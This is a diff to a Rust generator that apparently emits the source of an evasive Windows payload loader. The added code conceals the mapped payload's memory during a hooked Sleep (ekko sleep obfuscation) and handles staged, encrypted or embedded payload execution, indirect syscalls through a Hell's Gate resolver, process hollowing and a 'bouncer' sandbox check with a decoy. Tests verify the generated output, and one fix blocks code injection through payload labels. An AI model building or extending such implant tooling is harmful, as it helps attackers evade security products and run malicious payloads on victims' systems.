@@ -13,9 +13,9 @@
 
 use std::collections::BTreeMap;
 
-use super::api_resolution::{ApiResolutionConfig, ApiResolutionMode};
+use super::api_resolution::ApiResolutionConfig;
 use super::obfuscation::StringsConfig;
-use super::syscalls::{self, SyscallsConfig, SyscallsMode};
+use super::syscalls::{self, SyscallsConfig};
 use super::{args, debug, imports, stub, BuildError, Result};
 use crate::plan::schema::{
     ConsoleMode, DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
@@ -25,6 +25,7 @@ use crate::techniques::{Category, RuntimeStep, TechniqueKind};
 /// The builtin template's required placeholders (its contract).
 const REQUIRED: &[&str] = &[
     "$STUB_HELPERS$",
+    "$SLEEP_RUNTIME_BLOCK$",
     "$TLS_HANDOFF_BLOCK$",
     "$TLS_PROVISION$",
     "$ENTRY_BLOCK$",
@@ -105,6 +106,57 @@ fn expand_env(template: &str) -> String {
     }
     out.push_str(rest);
     out
+}
+
+// --- Payload region registry ---
+//
+// The loader that maps the payload records its image here, so a runtime hook
+// (the `Sleep` proxy) can conceal exactly the mapped payload and not the
+// loader's own image. Atomics, not `thread_local!`: proxies run on payload
+// threads, where the stub's TLS index is not provisioned.
+mod payload_region {
+    use core::sync::atomic::{AtomicUsize, Ordering};
+
+    static BASE: AtomicUsize = AtomicUsize::new(0);
+    static SIZE: AtomicUsize = AtomicUsize::new(0);
+    static CONCEALS: AtomicUsize = AtomicUsize::new(0);
+
+    /// Records a completed concealed sleep. The loader reports it after the
+    /// payload returns, so a lab run can tell the ekko path actually ran.
+    #[allow(dead_code)]
+    pub fn record_conceal() {
+        CONCEALS.fetch_add(1, Ordering::Relaxed);
+    }
+
+    /// How many concealed sleeps this process completed.
+    #[allow(dead_code)]
+    pub fn conceals() -> usize {
+        CONCEALS.load(Ordering::Relaxed)
+    }
+
+    /// Records the mapped payload image (`base`, `SizeOfImage`).
+    #[allow(dead_code)]
+    pub fn set(base: usize, size: usize) {
+        // Size first, base last: a reader that sees a non-zero base also sees
+        // the size (Release/Acquire).
+        SIZE.store(size, Ordering::Release);
+        BASE.store(base, Ordering::Release);
+    }
+
+    /// The mapped payload image, if a loader recorded one.
+    #[allow(dead_code)]
+    pub fn get() -> Option<(usize, usize)> {
+        let base = BASE.load(Ordering::Acquire);
+        if base == 0 {
+            return None;
+        }
+        let size = SIZE.load(Ordering::Acquire);
+        if size == 0 {
+            None
+        } else {
+            Some((base, size))
+        }
+    }
 }
 "#;
 
@@ -245,10 +297,7 @@ pub fn render_custom(
         );
     }
     let union = union_of(params);
-    if syscalls_config.mode == SyscallsMode::Indirect
-        && !syscalls::required(&union).is_empty()
-        && !template.contains("$SYSCALLS_BLOCK$")
-    {
+    if !syscalls::required(&union).is_empty() && !template.contains("$SYSCALLS_BLOCK$") {
         warnings.push(
             "loader stub does not reference $SYSCALLS_BLOCK$; the declared techniques' nt_* calls \
              will fail to compile"
@@ -269,14 +318,19 @@ pub fn render_custom(
                 .to_string(),
         );
     }
-    if api_resolution.mode == ApiResolutionMode::Proxy
-        && !api_resolution.apis.is_empty()
-        && imports::needed(&union)
-        && !template.contains("$API_RESOLUTION_BLOCK$")
+    if super::sleep_runtime::needed(&union, api_resolution)
+        && !template.contains("$SLEEP_RUNTIME_BLOCK$")
     {
         warnings.push(
+            "loader stub does not reference $SLEEP_RUNTIME_BLOCK$; 'sleep_obfuscation' and the \
+             'Sleep' hook will not compile"
+                .to_string(),
+        );
+    }
+    if !api_resolution.is_noop() && !template.contains("$API_RESOLUTION_BLOCK$") {
+        warnings.push(
             "loader stub does not reference $API_RESOLUTION_BLOCK$; the declared API resolution \
-             proxies will not be installed"
+             proxies and hooks will not be installed"
                 .to_string(),
         );
     }
@@ -346,6 +400,14 @@ fn render_common(
     values.insert("$STEP_MODULES$".to_string(), modules);
     values.insert("$STEP_RUNNER_BODY$".to_string(), runner);
     values.insert(
+        "$SLEEP_RUNTIME_BLOCK$".to_string(),
+        if super::sleep_runtime::needed(&union, api_resolution) {
+            super::sleep_runtime::render_block(strings)
+        } else {
+            String::new()
+        },
+    );
+    values.insert(
         "$SYSCALLS_BLOCK$".to_string(),
         syscalls::render_block_with(
             syscalls_config,
@@ -367,7 +429,7 @@ fn render_common(
     );
     values.insert(
         "$API_RESOLUTION_BLOCK$".to_string(),
-        if imports::needed(&union) {
+        if imports::needed(&union) || !api_resolution.is_noop() {
             super::api_resolution::render_block(api_resolution, strings)
         } else {
             String::new()
@@ -454,13 +516,6 @@ fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<Str
         // A sleep is a single line, not a module.
         return Ok(String::new());
     }
-    if let TechniqueKind::StackSpoofing { .. } = &step.technique {
-        // Stack spoofing is not a step module either: its block replaces the
-        // syscall layer's trampoline, so it is injected into `$SYSCALLS_BLOCK$`
-        // (a symbol can only exist once). Nothing runs when the runner reaches
-        // it.
-        return Ok(String::new());
-    }
 
     let format = step
         .payload
@@ -537,6 +592,15 @@ fn render_step_asset(step: &StepPayload) -> String {
     }
 }
 
+/// Sanitizes a step label for the generated line comment.
+///
+/// The label embeds the payload name, which the plan controls: a raw newline
+/// would close the comment and turn the rest of the name into stub code, so both
+/// line terminators become spaces.
+fn comment_label(label: &str) -> String {
+    label.replace(['\r', '\n'], " ")
+}
+
 /// Renders the runner body: one straight-line block per step, in order.
 fn render_runner_body(
     steps: &[StepPayload],
@@ -553,7 +617,8 @@ fn render_runner_body(
     for step in steps {
         body.push_str(&format!(
             "\n    // --- step {}: {} ---\n",
-            step.index, step.label
+            step.index,
+            comment_label(&step.label)
         ));
         if step.control.delay_ms > 0 {
             body.push_str(&sleep_line(step.control.delay_ms));
@@ -563,10 +628,6 @@ fn render_runner_body(
         match &step.technique {
             TechniqueKind::Sleep { params } => {
                 body.push_str(&sleep_line(params.ms));
-            }
-            TechniqueKind::StackSpoofing { .. } => {
-                // Installed with the syscall layer at startup: there is nothing
-                // to run, and nothing to report.
             }
             technique => match technique.category() {
                 Category::Preparation => {
@@ -588,7 +649,13 @@ fn render_runner_body(
                         ))
                     })?;
                     body.push_str(&render_execution_block(
-                        step.index, payload, strings, success, failure, debug,
+                        step.index,
+                        payload,
+                        strings,
+                        success,
+                        failure,
+                        step.control.on_fail,
+                        debug,
                     ));
                 }
                 Category::Control => {
@@ -626,6 +693,7 @@ fn render_execution_block(
     strings: &StringsConfig,
     success: &str,
     failure: &str,
+    on_fail: StepFailure,
     debug: bool,
 ) -> String {
     let marker_line = if debug {
@@ -645,15 +713,20 @@ fn render_execution_block(
     } else {
         "false"
     };
+    let label = format!("'step_{index}");
+    let (block_open, pre_failure) = step_block(&label, on_fail);
 
     match payload.source {
         // A staged payload is fetched at run time by a preceding
         // `network_stager` step and read from the shared slot, so there is no
         // embedded ciphertext.
         PayloadSource::Staged => format!(
-            "    {{\n\
+            "    {block_open}\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
-             \x20       let mut image = crate::take_staged_payload()?;\n\
+             \x20       let mut image = match crate::take_staged_payload() {{\n\
+             \x20           Ok(bytes) => bytes,\n\
+             \x20           Err(e) => {{ {pre_failure} }}\n\
+             \x20       }};\n\
              {marker_line}\
              \x20       match step_{index}::payload(&mut image) {{\n\
              \x20           Ok(code) => {{\n\
@@ -664,13 +737,15 @@ fn render_execution_block(
              \x20   }}\n",
             args = args,
             overridden = overridden,
+            block_open = block_open,
+            pre_failure = pre_failure,
             marker_line = marker_line,
             index = index,
         ),
         // `network_stager` with `fallback: embedded`: the fetched copy wins
         // when the fetch staged one, the embedded ciphertext otherwise.
         PayloadSource::StagedWithFallback => format!(
-            "    {{\n\
+            "    {block_open}\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
              \x20       let mut image = match crate::take_staged_payload() {{\n\
              \x20           Ok(bytes) => bytes,\n\
@@ -678,7 +753,10 @@ fn render_execution_block(
              \x20               let enc: &[u8] = include_bytes!(\"{path}\");\n\
              \x20               let payload_nonce: String = {nonce};\n\
              \x20               let payload_key: String = {key};\n\
-             \x20               decrypt_step(enc, &payload_nonce, &payload_key, {len})?\n\
+             \x20               match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
+             \x20                   Ok(bytes) => bytes,\n\
+             \x20                   Err(e) => {{ {pre_failure} }}\n\
+             \x20               }}\n\
              \x20           }}\n\
              \x20       }};\n\
              {marker_line}\
@@ -691,6 +769,8 @@ fn render_execution_block(
              \x20   }}\n",
             args = args,
             overridden = overridden,
+            block_open = block_open,
+            pre_failure = pre_failure,
             path = payload.path,
             nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
             key = secret_expr(&payload.key, "payload_key", strings),
@@ -699,12 +779,15 @@ fn render_execution_block(
             index = index,
         ),
         PayloadSource::Embedded => format!(
-            "    {{\n\
+            "    {block_open}\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
              \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
              \x20       let payload_nonce: String = {nonce};\n\
              \x20       let payload_key: String = {key};\n\
-             \x20       let mut image = decrypt_step(enc, &payload_nonce, &payload_key, {len})?;\n\
+             \x20       let mut image = match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
+             \x20           Ok(bytes) => bytes,\n\
+             \x20           Err(e) => {{ {pre_failure} }}\n\
+             \x20       }};\n\
              {marker_line}\
              \x20       match step_{index}::payload(&mut image) {{\n\
              \x20           Ok(code) => {{\n\
@@ -715,12 +798,34 @@ fn render_execution_block(
              \x20   }}\n",
             args = args,
             overridden = overridden,
+            block_open = block_open,
+            pre_failure = pre_failure,
             path = payload.path,
             nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
             key = secret_expr(&payload.key, "payload_key", strings),
             len = payload.plaintext_len,
             marker_line = marker_line,
             index = index,
+        ),
+    }
+}
+
+/// The opening of a step's runner block and its pre-payload failure action.
+///
+/// Only `continue` needs a label: it breaks out of the step block instead of
+/// returning from `run()`, so a later step still runs. `stop` and `exit` leave
+/// the chain exactly as the payload error arm does, in a plain block (a label
+/// they never use would draw `unused_labels` in the generated stub).
+fn step_block(label: &str, on_fail: StepFailure) -> (String, String) {
+    match on_fail {
+        StepFailure::Continue => (
+            format!("{label}: {{"),
+            format!("eprintln!(\"{{e}}\"); break {label};"),
+        ),
+        StepFailure::Stop => ("{".to_string(), "return Err(e);".to_string()),
+        StepFailure::Exit => (
+            "{".to_string(),
+            "eprintln!(\"{e}\"); return Ok(0);".to_string(),
         ),
     }
 }
@@ -833,6 +938,7 @@ pub(crate) fn test_params(
 mod tests {
     use super::*;
     use crate::engine::obfuscation::StringStrategy;
+    use crate::engine::syscalls::SyscallsMode;
     #[cfg(feature = "live-tests")]
     use crate::plan::schema::Arch;
     use crate::plan::schema::{StepFailure, StepOutcome};
@@ -963,6 +1069,58 @@ mod tests {
     }
 
     #[test]
+    fn a_sleep_hook_emits_the_runtime_and_the_proxy_block() {
+        let params = StepsParams {
+            steps: Vec::new(),
+            build_args: BTreeMap::new(),
+            debug: false,
+            windows_subsystem: false,
+            kind: OutputKind::Exe,
+            entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
+            poly_seed: None,
+        };
+        let api = ApiResolutionConfig {
+            mode: crate::engine::api_resolution::ApiResolutionMode::Proxy,
+            hooks: crate::engine::api_resolution::HooksConfig {
+                sleep: Some(crate::engine::api_resolution::SleepHookConfig {
+                    min_ms: 1000,
+                    max_ms: 600_000,
+                }),
+            },
+            ..ApiResolutionConfig::default()
+        };
+        let syscalls = SyscallsConfig {
+            mode: SyscallsMode::Indirect,
+            resolver: crate::engine::syscalls::Resolver::HellsGate,
+            ..Default::default()
+        };
+        let out =
+            render_builtin(&template(), &params, &strings(), &syscalls, &api).expect("render");
+
+        assert!(out.contains("mod sleep_runtime {"), "runtime missing");
+        assert!(out.contains("mod api_resolution {"), "proxies missing");
+        assert!(
+            out.contains("extern \"system\" fn proxy_0"),
+            "the Sleep proxy missing"
+        );
+        assert!(
+            out.contains("crate::sleep_runtime::ekko_sleep"),
+            "the proxy does not call the shared runtime"
+        );
+        // The debug prelude uses `$` as macro syntax, so cut it before looking
+        // for an unsubstituted placeholder.
+        let source = out
+            .split("// --- Debug instrumentation")
+            .next()
+            .unwrap_or(&out);
+        assert!(
+            !source.contains('$'),
+            "an unsubstituted placeholder survived"
+        );
+    }
+
+    #[test]
     fn a_delivery_build_emits_no_stub_marker() {
         let out = render(vec![execution_step(0)]);
         assert!(
@@ -1021,7 +1179,7 @@ mod tests {
             index: 0,
             label: "bouncer".to_string(),
             technique: serde_yml::from_str(
-                "technique: bouncer\nparams:\n  on_fail: decoy\n  hostname: h\n  decoy: { path: x, payload: p }\n",
+                "technique: bouncer\nparams:\n  on_reject:\n    action: decoy\n    decoy: { path: x, payload: p }\n  require: [{ hostname: h }]\n",
             )
             .expect("technique"),
             control: StepControl::default(),
@@ -1046,8 +1204,9 @@ mod tests {
     #[test]
     fn a_bouncer_without_a_decoy_still_compiles_the_helper() {
         let mut step = preparation_step(0);
-        step.technique = serde_yml::from_str("technique: bouncer\nparams: { hostname: h }\n")
-            .expect("technique");
+        step.technique =
+            serde_yml::from_str("technique: bouncer\nparams:\n  require: [{ hostname: h }]\n")
+                .expect("technique");
         let out = render(vec![step]);
         assert!(out.contains("fn asset_bytes()"), "stub helper missing");
         assert!(out.contains("Err(String::new())"), "stub body missing");
@@ -1126,7 +1285,7 @@ mod tests {
         }
         let out = render(vec![step]);
         assert!(
-            out.contains("crate::take_staged_payload()?"),
+            out.contains("crate::take_staged_payload()"),
             "the staged slot is not read"
         );
         assert!(
@@ -1351,6 +1510,93 @@ mod tests {
                 .iter()
                 .any(|w| w.contains("STEP_RUNNER_BODY")),
             "expected a runner warning: {:?}",
+            rendered.warnings
+        );
+    }
+
+    #[test]
+    fn a_staged_payload_failure_honours_on_fail_continue() {
+        let mut step = execution_step(0);
+        step.control = StepControl {
+            on_success: StepOutcome::Continue,
+            on_fail: StepFailure::Continue,
+            delay_ms: 0,
+        };
+        if let Some(payload) = step.payload.as_mut() {
+            payload.source = PayloadSource::Staged;
+        }
+        let out = render(vec![step]);
+        assert!(
+            out.contains("'step_0: {"),
+            "the step block is not labeled: {out}"
+        );
+        assert!(
+            out.contains("eprintln!(\"{e}\"); break 'step_0;"),
+            "a staging failure does not break out of the step: {out}"
+        );
+    }
+
+    #[test]
+    fn a_decryption_failure_honours_on_fail_exit() {
+        let mut step = execution_step(0);
+        step.control = StepControl {
+            on_success: StepOutcome::Continue,
+            on_fail: StepFailure::Exit,
+            delay_ms: 0,
+        };
+        let out = render(vec![step]);
+        assert!(
+            out.contains("Err(e) => { eprintln!(\"{e}\"); return Ok(0); }"),
+            "a decryption failure does not take the exit action: {out}"
+        );
+    }
+
+    #[test]
+    fn a_payload_name_cannot_inject_a_source_line_into_the_step_comment() {
+        let mut step = execution_step(0);
+        step.label = "reflective_loading 'p\nfn injected() {}'".to_string();
+        let out = render(vec![step]);
+        assert!(
+            out.contains("// --- step 0: reflective_loading 'p fn injected() {}' ---"),
+            "the newline was not flattened into the comment: {out}"
+        );
+        assert!(
+            !out.lines()
+                .any(|line| line.trim_start().starts_with("fn injected()")),
+            "the payload name produced a source line: {out}"
+        );
+    }
+
+    /// The `nt_*` helpers are emitted whenever a technique needs them, in both
+    /// syscall modes, so the custom-stub warning must not depend on `indirect`.
+    #[test]
+    fn a_custom_stub_ignoring_the_syscalls_block_warns_without_indirect_mode() {
+        let mut step = execution_step(0);
+        step.technique = serde_yml::from_str("technique: process_hollowing\n").expect("technique");
+        let params = StepsParams {
+            steps: vec![step],
+            build_args: BTreeMap::new(),
+            debug: false,
+            windows_subsystem: false,
+            kind: OutputKind::Exe,
+            entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
+            poly_seed: None,
+        };
+        let rendered = render_custom(
+            "fn main() {}\n",
+            &params,
+            &strings(),
+            &SyscallsConfig::default(),
+            &ApiResolutionConfig::default(),
+        )
+        .expect("render");
+        assert!(
+            rendered
+                .warnings
+                .iter()
+                .any(|w| w.contains("SYSCALLS_BLOCK")),
+            "expected a syscalls warning under mode: none: {:?}",
             rendered.warnings
         );
     }
